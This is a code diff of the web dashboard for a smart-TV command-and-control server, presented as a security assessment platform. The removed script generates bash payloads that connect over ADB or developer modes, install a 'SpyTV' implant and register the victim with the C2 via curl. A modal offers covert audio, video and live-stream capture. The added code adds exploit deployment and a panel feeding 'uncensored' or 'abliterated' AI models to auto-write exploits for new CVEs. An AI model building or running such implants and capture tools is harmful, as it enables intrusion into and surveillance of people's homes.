-                            <div class="stat-label">CVEs</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Devices Tab -->
-            <div id="tab-devices" class="tab-content active">
-                <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Device Registry</span>
-                        <button class="btn btn-sm" onclick="refreshDevices()">Refresh</button>
-                    </div>
-                    <div class="card-body">
-                        <div id="device-list">
-                            <p class="loading">No devices registered yet. Start a scan to discover devices.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Network Scan Tab -->
-            <div id="tab-scan" class="tab-content">
-                <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Network Discovery</span>
-                    </div>
-                    <div class="card-body">
-                        <div class="alert alert-info">
-                            In standalone Android mode, network scanning requires command execution.
-                            Use Console mode for full network discovery capabilities.
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label">Target IP</label>
-                            <input type="text" id="check-ip" class="form-input" placeholder="192.168.1.100">
-                        </div>
-                        <div class="form-row">
-                            <button class="btn btn-primary" onclick="checkDevice()">Check Device</button>
-                            <button class="btn btn-success" onclick="registerDevice()">Register</button>
-                        </div>
-                        <div id="scan-results" style="margin-top: 16px;"></div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Payload Tab -->
-            <div id="tab-payload" class="tab-content">
-                <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Payload Generator</span>
-                    </div>
-                    <div class="card-body">
-                        <div class="form-group">
-                            <label class="form-label">Target IP Address</label>
-                            <input type="text" id="payload-ip" class="form-input" placeholder="192.168.1.100">
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label">Device Family</label>
-                            <select id="payload-family" class="form-select">
-                                <option value="android-tv">Android TV / Fire TV</option>
-                                <option value="samsung-tizen">Samsung Tizen</option>
-                                <option value="lg-webos">LG webOS</option>
-                                <option value="roku">Roku</option>
-                                <option value="vizio">Vizio</option>
-                                <option value="chromecast">Chromecast / Google TV</option>
-                                <option value="hisense">Hisense</option>
-                                <option value="tcl">TCL</option>
-                            </select>
-                        </div>
-                        <div class="form-row">
-                            <button class="btn btn-primary" onclick="generatePayload()">Generate</button>
-                            <button class="btn btn-success" onclick="sendCommandToAndroid()">Deploy via ADB</button>
-                        </div>
-                        <div id="payload-output" style="margin-top: 16px;"></div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Server Info Tab -->
-            <div id="tab-server" class="tab-content">
-                <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Server Information</span>
-                    </div>
-                    <div class="card-body">
-                        <div id="server-info">
-                            <p class="loading">Loading server info...</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </main>
-    
-    <footer class="footer">
-        <p>&copy; 2026 Authenticated, Inc. All rights reserved.</p>
-    </footer>
-    
-    <!-- Audio/Video Capture Modal -->
-    <div id="capture-modal" class="modal-overlay">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Capture Media</h3>
-            </div>
-            <div class="modal-body">
-                <div id="capture-form">
-                    <div class="form-group">
-                        <label class="form-label">Mode</label>
-                        <select id="capture-mode" class="form-select">
-                            <option value="audio">Audio Recording</option>
-                            <option value="video">Video Recording</option>
-                            <option value="live">Live Stream</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Duration (minutes)</label>
-                        <input type="number" id="capture-duration" class="form-input" value="5" min="1" max="60">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Device ID</label>
-                        <input type="text" id="capture-device-id" class="form-input" placeholder="Enter device ID or select from list">
-                    </div>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button class="btn" onclick="closeModal()">Cancel</button>
-                <button class="btn btn-primary" onclick="executeCapture()">Capture</button>
-            </div>
-        </div>
+
+<!-- Header -->
+<header class="header">
+  <img src="/logo.png" alt="Authenticated, Inc." class="header-logo" onerror="this.style.display='none'">
+  <div class="header-title">
+    <h1>TV Security Assessment Platform</h1>
+    <p>Authenticated, Inc.</p>
+  </div>
+  <nav class="header-nav">
+    <a href="/docs/WIKI.md" target="_blank" data-tooltip="Documentation and guides (viewed from the C2)">Wiki</a>
+    <a href="/docs/TROUBLESHOOTING.md" target="_blank" data-tooltip="Troubleshooting guide (viewed from the C2)">Troubleshooting</a>
+  </nav>
+  <div class="header-stats">
+    <div class="stat">
+      <div class="stat-value" id="stat-devices">0</div>
+      <div class="stat-label">Devices</div>
     </div>
-    
-    <script>
-        const API = '';
-        let devices = [];
-        let clips = [];
-        let startTime = Date.now();
-        
-        function switchTab(tab) {
-            document.querySelectorAll('.nav-item').forEach(t => {
-                const on = t.getAttribute('onclick') === `switchTab('${tab}')`;
-                t.classList.toggle('active', on);
-            });
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.getElementById(`tab-${tab}`).classList.add('active');
-        }
-        
-        async function api(path, method = 'GET', body = null) {
-            const opts = { method, headers: { 'Content-Type': 'application/json' } };
-            if (body) opts.body = JSON.stringify(body);
-            
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 15000);
-            opts.signal = controller.signal;
-            
-            try {
-                const response = await fetch(API + path, opts);
-                clearTimeout(timeout);
-                const data = await response.json();
-                if (!response.ok && !data.error) {
-                    data.error = `HTTP ${response.status}`;
-                }
-                return data;
-            } catch (e) {
-                clearTimeout(timeout);
-                return { error: e.message || 'Network error' };
-            }
-        }
-        
-        async function refreshDevices() {
-            const res = await api('/api/devices');
-            if (res.error) {
-                document.getElementById('device-list').innerHTML = `<p class="alert alert-warning">Failed to load devices: ${res.error}</p>`;
-                return;
-            }
-            devices = Array.isArray(res) ? res : [];
-            renderDevices();
-        }
-        
-        function renderDevices() {
-            const el = document.getElementById('device-list');
-            document.getElementById('stat-devices').textContent = devices.length;
-            
-            if (devices.length === 0) {
-                el.innerHTML = '<p class="loading">No devices registered. Add devices via the scan tab.</p>';
-                return;
-            }
-            
-            el.innerHTML = devices.map(d => `
-                <div class="device-card" style="background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 12px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <div>
-                            <strong style="color: var(--accent);">${d.ip}</strong>
-                            <br><span style="color: var(--text-muted); font-size: 12px;">${d.family || d.tv_type || 'Unknown'}</span>
-                        </div>
-                    </div>
-                </div>
-            `).join('');
-        }
-        
-        async function checkDevice() {
-            const ip = document.getElementById('check-ip').value.trim();
-            const results = document.getElementById('scan-results');
-            
-            if (!ip) {
-                results.innerHTML = '<div class="alert alert-warning">Enter an IP address.</div>';
-                return;
-            }
-            
-            results.innerHTML = '<p>Checking device...</p>';
-            
-            // Basic port check simulation
-            const port = 5555;
-            results.innerHTML = `
-                <div class="alert alert-info">Checking ${ip}:${port}...</div>
-                <p>Device check initiated. In standalone mode, actual port checking requires console mode.</p>
-            `;
-            
-            // Auto-register for demo purposes
-            const deviceId = btoa(ip).slice(0, 12);
-            await api('/api/register', 'POST', {
-                ip: ip,
-                family: 'android-tv',
-                entry: 'standalone'
-            });
-            await refreshDevices();
-        }
-        
-        async function registerDevice() {
-            const ip = document.getElementById('check-ip').value.trim();
-            const family = document.getElementById('payload-family').value;
-            
-            if (!ip) {
-                alert('Enter an IP address');
-                return;
-            }
-            
-            await api('/api/register', 'POST', {
-                ip: ip,
-                family: family,
-                entry: 'manual'
-            });
-            await refreshDevices();
-            document.getElementById('check-ip').value = '';
-        }
-        
-        function generatePayload() {
-            const ip = document.getElementById('payload-ip').value.trim();
-            const family = document.getElementById('payload-family').value;
-            const output = document.getElementById('payload-output');
-            
-            if (!ip) {
-                output.innerHTML = '<div class="alert alert-warning">Enter a target IP address.</div>';
-                return;
-            }
-            
-            const payload = generateExploitScript(ip, family);
-            output.innerHTML = `
-                <div class="alert alert-success">Payload generated for ${ip}</div>
-                <pre style="background: var(--bg); padding: 12px; border-radius: 6px; overflow-x: auto; font-family: monospace; font-size: 12px;">${escapeHtml(payload)}</pre>
-            `;
-        }
-        
-        function generateExploitScript(ip, family) {
-            const c2Port = window.location.port || '8443';
-            const c2Ip = window.location.hostname || '127.0.0.1';
-            
-            switch (family) {
-                case 'android-tv':
-                    return `#!/bin/bash
-# Android TV / Fire TV ADB Exploit
-# Target: ${ip}
-# C2: ${c2Ip}:${c2Port}
+    <div class="stat">
+      <div class="stat-value" id="stat-clips">0</div>
+      <div class="stat-label">Clips</div>
+    </div>
+    <div class="stat">
+      <div class="stat-value" id="stat-ip">—</div>
+      <div class="stat-label">C2 IP</div>
+    </div>
+  </div>
+</header>
 
-echo "Installing SpyTV implant on ${ip}..."
-adb connect ${ip}:5555 2>/dev/null
-adb -s ${ip}:5555 install /sdcard/tvreaper.apk 2>/dev/null
-curl -X POST http://${c2Ip}:${c2Port}/api/register \\
-  -H "Content-Type: application/json" \\
-  -d '{"ip":"${ip}","family":"AndroidTV","entry":"adb-net"}'
-echo "Implant installed. C2: ${c2Ip}:${c2Port}"`;
-                case 'samsung-tizen':
-                    return `#!/bin/bash
-# Samsung Tizen Exploit
-# Target: ${ip}:26101
-# C2: ${c2Ip}:${c2Port}
+<!-- Navigation -->
+<nav class="nav" role="tablist" aria-label="Dashboard sections">
+  <div class="nav-item active" role="tab" tabindex="0" aria-selected="true" onclick="switchTab('devices')">Devices</div>
+  <div class="nav-item" role="tab" tabindex="0" aria-selected="false" onclick="switchTab('scan')">Network Scan</div>
+  <div class="nav-item" role="tab" tabindex="0" aria-selected="false" onclick="switchTab('payload')">Payload Generator</div>
+  <div class="nav-item" role="tab" tabindex="0" aria-selected="false" onclick="switchTab('cve')">CVE Monitor</div>
+  <div class="nav-item" role="tab" tabindex="0" aria-selected="false" onclick="switchTab('server')">Server Info</div>
+</nav>
 
-sdb connect ${ip}:26101 2>/dev/null
-curl -X POST http://${c2Ip}:${c2Port}/api/register \\
-  -H "Content-Type: application/json" \\
-  -d '{"ip":"${ip}","family":"Samsung(Tizen)","entry":"tizen-dev"}'
-echo "Implant installed on ${ip}"`;
-                case 'lg-webos':
-                    return `#!/bin/bash
-# LG webOS Exploit
-# Target: ${ip}
-# C2: ${c2Ip}:${c2Port}
+<!-- Engagement status banner (Audit / Patch-all) -->
+<div id="engagement-status" class="engagement-banner" role="status" aria-live="polite" hidden>
+  <span class="eng-dot" id="eng-dot"></span>
+  <div class="eng-text">
+    <strong id="eng-title">Engagement</strong>
+    <span id="eng-msg">—</span>
+  </div>
+  <div class="eng-track" aria-hidden="true"><div class="eng-bar" id="eng-bar"></div></div>
+  <span class="eng-pct" id="eng-pct">0%</span>
+  <div class="eng-actions">
+    <button class="btn btn-sm btn-primary" id="eng-report-btn" hidden onclick="openEngagementReport()">&#128196; Report</button>
+    <button class="btn btn-sm" id="eng-auth-btn" hidden onclick="openEngagementAuthorization()">&#9997; Authorization</button>
+    <button class="btn btn-sm" id="eng-close-btn" hidden onclick="dismissEngagement()">Dismiss</button>
+  </div>
+</div>
 
-ares-install --device tv@${ip} /sdcard/tvreaper.ipk 2>/dev/null || echo "Dev mode required"
-curl -X POST http://${c2Ip}:${c2Port}/api/register \\
-  -H "Content-Type: application/json" \\
-  -d '{"ip":"${ip}","family":"LG(webOS)","entry":"webos-dev"}'
-echo "Implant installed on ${ip}"`;
-                case 'roku':
-                    return `#!/bin/bash
-# Roku ECP Exploit
-# Target: ${ip}:8060
+<!-- Main Content -->
+<main class="main">
+<div class="main-layout">
+<div class="main-content">
 
-curl -X POST http://${ip}:8060/launch/851 2>/dev/null || echo "ECP control available"
-curl -X POST http://${c2Ip}:${c2Port}/api/register \\
-  -H "Content-Type: application/json" \\
-  -d '{"ip":"${ip}","family":"RokuTV","entry":"roku-ecp"}'`;
-                default:
-                    return `#!/bin/bash
-# Generic Payload for ${family}
-# Target: ${ip}
-# C2: ${c2Ip}:${c2Port}
+  <!-- Devices Tab -->
+  <div id="tab-devices" class="tab-content active">
+    <div class="card" style="margin-bottom:20px">
+      <div class="card-header">
+        <span class="card-title">Activity Log</span>
+        <button class="btn btn-sm" onclick="clearLogs()" data-tooltip="Clear all log entries">Clear Logs</button>
+      </div>
+      <div class="card-body">
+        <div class="log-container" id="log-container">
+          <div class="log-entry"><span class="time">[--:--:--]</span> System initialized. Waiting for events...</div>
+        </div>
+      </div>
+    </div>
 
-curl -X POST http://${c2Ip}:${c2Port}/api/register \\
-  -H "Content-Type: application/json" \\
-  -d '{"ip":"${ip}","family":"${family}","entry":"standalone"}'
-echo "Implant installed on ${ip}"`;
+    <div id="device-grid" class="device-grid"></div>
+
+    <div id="empty-state" class="empty-state">
+      <div class="empty-state-icon">&#128250;</div>
+      <h3>No Devices Connected</h3>
+      <p>Devices will appear here when they connect to the C2 server.</p>
+    </div>
+  </div>
+
+  <!-- Network Scan Tab -->
+  <div id="tab-scan" class="tab-content">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">Network Discovery</span>
+        <div class="help-icon">?
+          <div class="tooltip">Scans the local network for vulnerable TVs — including every device family in the CVE database (Samsung Tizen, LG webOS, Android TV, Roku, Vizio, Hisense, TCL, Chromecast) via their signature ports. Each result shows open ports, the matched CVEs (colored by severity), and status. Use "Check" to verify a device before exploitation, "Exploit" to stage a payload, or "Patch" to execute that family's remediation commands and fix the matched CVEs on the device.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-info">
+          &#8505;&#65039; Scan the local network to discover vulnerable TVs and IoT devices.
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Network Range (CIDR)</label>
+            <input type="text" id="scan-cidr" class="form-input" placeholder="192.168.1.0/24">
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-primary" id="scan-btn" onclick="startScan()" data-tooltip="Scan the network (generic ports + all CVE-database family signature ports) and match CVEs">Scan</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn" onclick="saveScanResults()" data-tooltip="Save scan results to file">Save</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn" onclick="clearScanResults()" data-tooltip="Clear scan results">Clear</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-warning" onclick="startAudit()" data-tooltip="Full audit engagement: client details → authorization form (e-sign) → scan → dry-run checks → send exploits → kill all connections → PDF report">&#128269; Audit</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-success" onclick="startPatchAll()" data-tooltip="Patch every device on the network first, then collect client details and generate a remediation report (PDF)">&#128736; Patch All</button>
+          </div>
+        </div>
+        <div id="check-result" class="check-result" hidden></div>
+        <div id="scan-results"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payload Generator Tab -->
+  <div id="tab-payload" class="tab-content">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">Exploit Payload Generator</span>
+        <div class="help-icon">?
+          <div class="tooltip">Generates family-specific exploit payloads that connect back to this C2 server. Select target IP and device family, then click Generate to create the payload. Click Exploit to execute the exploit module against the target right now — the activity log reports the module's real outcome (success, failure, timeout or error, with duration).</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-warning">
+          &#9888;&#65039; For authorized security testing only. Use only on devices you own or have permission to test.
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Target IP Address</label>
+            <input type="text" id="payload-ip" class="form-input" placeholder="192.168.1.100">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Device Family</label>
+            <select id="payload-family" class="form-select">
+              <option value="tizen-dev">Samsung Tizen</option>
+              <option value="webos-dev">LG webOS</option>
+              <option value="adb-net">Android TV / Fire TV</option>
+              <option value="roku-ecp">Roku</option>
+              <option value="vizio-dial">Vizio SmartCast</option>
+              <option value="chromecast-cast">Chromecast / Google TV</option>
+              <option value="hisense">Hisense VIDAA</option>
+              <option value="tcl">TCL Android TV</option>
+              <option value="dlna">DLNA (Generic)</option>
+            </select>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-primary" id="payload-generate" onclick="generatePayload()" data-tooltip="Generate exploit payload">Generate</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-success" id="payload-exploit" onclick="deployPayload()" data-tooltip="Run the exploit module against the target and report the real result">Exploit</button>
+          </div>
+        </div>
+        <div id="payload-output"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CVE Monitor Tab -->
+  <div id="tab-cve" class="tab-content">
+    <div class="card" style="margin-bottom:20px">
+      <div class="card-header">
+        <span class="card-title">CVE Monitor &amp; Patch Management</span>
+        <div class="help-icon">?
+          <div class="tooltip">Fetches new smart TV CVEs from NVD (runs automatically at every C2 start and on "Update CVEs"). New entries land in the CVE Feed on the right and in CVE_UPDATES.log at the repo root. Use "View Whitepaper" / "View Vulnerability Info" on any feed entry to render it in the Output panel; each press replaces the previous content. Use "Patch" on a scan result or device card to execute that device family's remediation commands against the matched TVs. With an AI key configured, every new CVE gets the full artifact set: exploit module, whitepaper, a pytest test that must pass, a detection-signature proposal and a patch-check proposal.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-info">
+          &#8505;&#65039; Monitor known CVEs affecting smart TVs and apply patches to vulnerable devices found on the network.
+        </div>
+        <div class="controls" style="margin-bottom:20px">
+          <button class="btn btn-primary" onclick="updateCVEs()" data-tooltip="Fetch new CVEs from NVD + auto-generate exploits (AI)">&#128260; Update CVEs</button>
+          <button class="btn" onclick="loadCVEs()" data-tooltip="Refresh the known-CVE table">&#128260; Refresh</button>
+          <button class="btn" onclick="loadFeed(true)" data-tooltip="Refresh the CVE feed sidebar">&#128228; Refresh Feed</button>
+        </div>
+        <div id="cve-update-status" class="alert alert-success" style="display:none"></div>
+        <div id="cve-results"></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">AI Provider Keys (Auto-Exploit Generation)</span>
+        <div class="help-icon">?
+          <div class="tooltip">Keys used to generate a working exploit module for each new CVE automatically. Providers: OpenRouter (Uncensored), Venice AI (Uncensored V 1.2 / Qwen 3.6 Plus Uncensored / GLM 4.7 Flash Heretic), Abliteration.ai (Abliterated Large v2), and a keyless Local Model — a llama.cpp GGUF or Apple MLX server hosted by the C2 machine (enter its endpoint URL; default http://127.0.0.1:8080/v1/chat/completions). Keys can also be supplied via .env (checked first by run_c2.bat) or c2_data/ai_keys.json. Keys are masked after saving.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-warning">
+          &#9888;&#65039; Keys are stored locally in <code>c2_data/ai_keys.json</code>. Never commit this file.
+        </div>
+        <div id="ai-key-status" class="server-info" style="margin-bottom:16px"></div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">OpenRouter (Uncensored)</label>
+            <input type="password" id="key-openrouter" class="form-input" placeholder="sk-or-…" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Venice AI</label>
+            <input type="password" id="key-venice" class="form-input" placeholder="Venice API key" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Abliteration.ai (Abliterated Large v2)</label>
+            <input type="password" id="key-abliteration" class="form-input" placeholder="Abliteration API key" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Local Model (GGUF / MLX — no key)</label>
+            <input type="text" id="key-local" class="form-input" placeholder="http://127.0.0.1:8080/v1/chat/completions" autocomplete="off">
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Venice Model</label>
+            <select id="venice-model" class="form-select">
+              <option value="uncensored_v1_2">Uncensored V 1.2</option>
+              <option value="qwen_3_6_plus_uncensored">Qwen 3.6 Plus Uncensored</option>
+              <option value="glm_4_7_flash_heretic">GLM 4.7 Flash Heretic</option>
+            </select>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-primary" onclick="saveAiKeys()" data-tooltip="Save keys to c2_data/ai_keys.json">Save Keys</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-success" onclick="testAiGeneration()" data-tooltip="Generate an exploit for the newest feed CVE as a test">&#9889; Test Generate</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Server Info Tab -->
+  <div id="tab-server" class="tab-content">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">C2 Server Information</span>
+        <div class="help-icon">?
+          <div class="tooltip">Shows real C2 host details (IPs, MAC, hostname, OS, Python, uptime) and a control that kills every connection opened by this C2 (tracked sockets + exploit child tools), with verification.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="server-info" id="server-info">
+          <div class="info-item"><span class="label">IPv4</span><span class="value" id="srv-ipv4">—</span></div>
+          <div class="info-item"><span class="label">IPv6</span><span class="value" id="srv-ipv6">—</span></div>
+          <div class="info-item"><span class="label">MAC address</span><span class="value" id="srv-mac">—</span></div>
+          <div class="info-item"><span class="label">Hostname</span><span class="value" id="srv-hostname">—</span></div>
+          <div class="info-item"><span class="label">Operating system</span><span class="value" id="srv-os">—</span></div>
+          <div class="info-item"><span class="label">Python</span><span class="value" id="srv-python">—</span></div>
+          <div class="info-item"><span class="label">C2 port</span><span class="value" id="srv-port">—</span></div>
+          <div class="info-item"><span class="label">C2 uptime</span><span class="value" id="srv-uptime">—</span></div>
+          <div class="info-item"><span class="label">C2 started</span><span class="value" id="srv-started">—</span></div>
+        </div>
+        <div class="controls" style="margin-top:20px">
+          <button class="btn btn-danger" onclick="killAllConnections()" data-tooltip="Close every socket tracked by this C2, terminate exploit child tools, and verify no connections to engagement targets remain">&#9861; Kill All Connections</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /main-content -->
+
+<!-- Right column: output panel + CVE feed (T-01 — equal width to the left card) -->
+<div class="right-column">
+  <section class="card" id="output-panel" aria-live="polite">
+    <div class="card-header">
+      <span class="card-title">Output</span>
+      <div style="display:flex;align-items:center;gap:6px">
+        <button class="btn btn-sm" onclick="resetOutput()"
+          data-tooltip="Clear the output panel">Clear</button>
+        <div class="help-icon">?
+          <div class="tooltip">Right-side output panel (replaces the previous content on every press; resets when the C2 starts). "View Whitepaper" renders the generated whitepaper for a CVE (AI-assisted when a provider key is configured, deterministic template otherwise). "View Vulnerability Info" shows severity, CVSS, CWE, affected products, fixed version, attack vector, exploit status and the artifact flags (whitepaper / test / signature / patch-check).</div>
+        </div>
+      </div>
+    </div>
+    <div id="output-body">
+      <p class="output-empty">Nothing selected yet. Use <b>View Whitepaper</b> or
+      <b>View Vulnerability Info</b> on any CVE in the feed &#8594;</p>
+    </div>
+  </section>
+
+<!-- CVE Feed (right sidebar) -->
+<aside class="feed-panel" id="feed-panel">
+  <div class="card-header">
+    <span class="card-title">CVE Feed</span>
+    <div class="help-icon">?
+      <div class="tooltip">Live feed of smart TV CVEs. Refreshed automatically every time the C2 starts and via the "Update CVEs" button on the CVE Monitor tab. New entries are logged to CVE_UPDATES.log in the repository root. Each entry links to its NVD advisory and whitepaper, and has "View Whitepaper" / "View Vulnerability Info" buttons that render into the Output panel. With an AI provider key configured, each new CVE gets a full artifact set: exploit module, whitepaper, a pytest test that must pass, a detection-signature proposal and a patch-check proposal.</div>
+    </div>
+  </div>
+  <div class="feed-list" id="feed-list">
+    <p style="color:var(--text-muted);font-size:12px;padding:8px">Loading feed...</p>
+  </div>
+  <div class="feed-meta">
+    <span id="feed-count">0 CVEs</span>
+    <span id="feed-updated">—</span>
+  </div>
+</aside>
+</div><!-- /right-column -->
+</div><!-- /main-layout -->
+
+</main>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>&copy; 2026 Authenticated, Inc. All rights reserved.</p>
+</footer>
+
+<!-- Confirmation Modal -->
+<div id="modal" class="modal-overlay">
+  <div class="modal">
+    <div class="modal-header">
+      <h3 class="modal-title" id="modal-title">Confirm Action</h3>
+    </div>
+    <div class="modal-body">
+      <p id="modal-message" style="color:var(--text-secondary);font-size:14px">Are you sure?</p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-danger" id="modal-confirm">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<!-- Payload Modal -->
+<div id="payload-modal" class="modal-overlay">
+  <div class="modal">
+    <div class="modal-header">
+      <h3 class="modal-title">Generated Payload</h3>
+    </div>
+    <div class="modal-body">
+      <div class="code-block" id="payload-text"></div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn" onclick="closePayloadModal()">Close</button>
+      <button class="btn btn-primary" onclick="copyPayload()">Copy to Clipboard</button>
+    </div>
+  </div>
+</div>
+
+<!-- Client Details Modal (Audit authorization step / Patch report step) -->
+<div id="client-modal" class="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="client-modal-title">
+  <div class="modal modal-lg">
+    <div class="modal-header">
+      <h3 class="modal-title" id="client-modal-title">Client Details</h3>
+      <p class="modal-sub" id="client-modal-sub">These details appear on the authorization form and the final report.</p>
+    </div>
+    <div class="modal-body">
+      <div id="client-errors" class="alert alert-warning" hidden></div>
+      <form id="client-form" class="form-grid" onsubmit="return false;">
+        <div class="form-group">
+          <label class="form-label" for="cf-company">Legal company name *</label>
+          <input type="text" class="form-input" id="cf-company" autocomplete="organization" placeholder="Acme Streaming Ltd">
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="cf-name">Authorized representative *</label>
+          <input type="text" class="form-input" id="cf-name" autocomplete="name" placeholder="Full name">
+        </div>
+        <div class="form-group span-2">
+          <label class="form-label" for="cf-address">Address *</label>
+          <input type="text" class="form-input" id="cf-address" autocomplete="street-address" placeholder="Street, city, state, ZIP">
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="cf-phone">Phone *</label>
+          <input type="tel" class="form-input" id="cf-phone" autocomplete="tel" placeholder="+1 555 000 0000">
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="cf-email">Email *</label>
+          <input type="email" class="form-input" id="cf-email" autocomplete="email" placeholder="name@company.com">
+        </div>
+        <div class="form-group span-2">
+          <label class="form-label" for="cf-website">Website *</label>
+          <input type="url" class="form-input" id="cf-website" autocomplete="url" placeholder="https://company.com">
+        </div>
+      </form>
+    </div>
+    <div class="modal-footer">
+      <button class="btn" onclick="closeClientModal()">Cancel</button>
+      <button class="btn btn-primary" id="client-submit" onclick="submitClientForm()">Continue</button>
+    </div>
+  </div>
+</div>
+
+<!-- Authorization E-Sign Modal (audit gate) -->
+<div id="auth-modal" class="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="auth-modal-title">
+  <div class="modal modal-xl">
+    <div class="modal-header">
+      <h3 class="modal-title" id="auth-modal-title">Authorization — Rules of Engagement</h3>
+      <p class="modal-sub">Review the form pre-signed by Authenticated, Inc., then sign below to start the audit.</p>
+    </div>
+    <div class="modal-body">
+      <div id="auth-errors" class="alert alert-warning" hidden></div>
+      <div class="auth-grid">
+        <div class="auth-doc">
+          <iframe id="auth-frame" title="Authorization form (PDF)" src="about:blank"></iframe>
+        </div>
+        <div class="auth-sign">
+          <div class="form-group">
+            <label class="form-label" for="auth-company">Client company (signing entity) *</label>
+            <input type="text" class="form-input" id="auth-company" autocomplete="organization">
+          </div>
+          <div class="form-group">
+            <span class="form-label" id="sig-label">Representative signature *</span>
+            <div class="sig-wrap">
+              <canvas id="sig-canvas" aria-labelledby="sig-label" aria-label="Signature pad — draw with mouse, finger or stylus"></canvas>
+            </div>
+            <div class="sig-hint" id="sig-hint">Draw your signature above.</div>
+          </div>
+          <div class="form-group">
+            <span class="form-label">Signing as</span>
+            <div class="sig-name" id="auth-rep">—</div>
+          </div>
+          <p class="auth-note">By signing you execute this authorization electronically. Both parties agree electronic signatures are legally binding (ESIGN Act, 15 U.S.C. §7001 / UETA). A SHA-256 record hash and audit trail are embedded in the signed document.</p>
+        </div>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn" onclick="closeAuthModal()">Cancel</button>
+      <button class="btn" onclick="clearSignature()">Clear Signature</button>
+      <button class="btn btn-success" id="auth-sign-btn" onclick="signAndStart()">Sign &amp; Start Audit</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const API = '';
+let devices = [];
+let clips = [];
+let selectedDuration = 5;
+let modalCallback = null;
+let localIp = '';
+let cveDb = {};          // tv_type -> [cves] from /api/cves
+let aiStatus = {};       // masked AI key status
+let feedData = null;     // last CVE feed payload
+let lastScanResults = null;   // last /api/scan results (for Save)
+let clientModalMode = 'audit'; // 'audit' | 'patch'
+let engPollTimer = null;  // engagement status poll interval
+let engKind = null;       // engagement being polled ('audit' | 'patch')
+let lastAuthId = null;    // authorization id (for the signed copy link)
+let patchPrompted = false; // client modal already shown for this patch run
+let currentAuth = null;   // {auth_id, pdf_url} of the form being signed
+let sigCtx = null;        // signature pad drawing context
+let sigCanvas = null;     // signature pad canvas element
+let sigInk = false;       // signature pad has strokes
+
+const FAMILY_TVTYPE = {
+  'samsung': 'samsung-tizen', 'tizen': 'samsung-tizen', 'samsung(tizen)': 'samsung-tizen',
+  'lg': 'lg-webos', 'webos': 'lg-webos', 'lg(webos)': 'lg-webos',
+  'androidtv': 'android-tv', 'android tv': 'android-tv', 'android tv/fire tv': 'android-tv',
+  'fire tv': 'android-tv', 'adb-net': 'android-tv',
+  'roku': 'roku', 'roku tv': 'roku', 'roku-ecp': 'roku',
+  'vizio': 'vizio', 'vizio smartcast': 'vizio', 'vizio-dial': 'vizio',
+  'hisense': 'hisense', 'hisense vidaa': 'hisense',
+  'tcl': 'tcl', 'tcl android tv': 'tcl',
+  'chromecast': 'chromecast', 'google tv': 'chromecast', 'chromecast / google tv': 'chromecast',
+};
+
+function familyToTvType(family) {
+  const f = (family || '').toLowerCase().trim();
+  if (FAMILY_TVTYPE[f]) return FAMILY_TVTYPE[f];
+  for (const key of Object.keys(FAMILY_TVTYPE)) {
